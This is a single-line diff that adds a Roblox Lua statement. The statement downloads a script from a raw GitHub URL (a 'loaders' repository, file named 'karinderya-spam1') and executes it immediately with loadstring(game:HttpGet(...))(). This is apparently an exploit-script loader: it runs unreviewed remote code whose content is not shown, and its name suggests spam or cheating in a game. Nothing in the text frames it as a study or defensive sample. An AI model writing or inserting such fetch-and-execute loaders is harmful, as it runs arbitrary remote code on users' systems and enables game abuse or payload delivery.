@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/karinderya-spam1-uouwjjy0l6ffb0.lua"))()
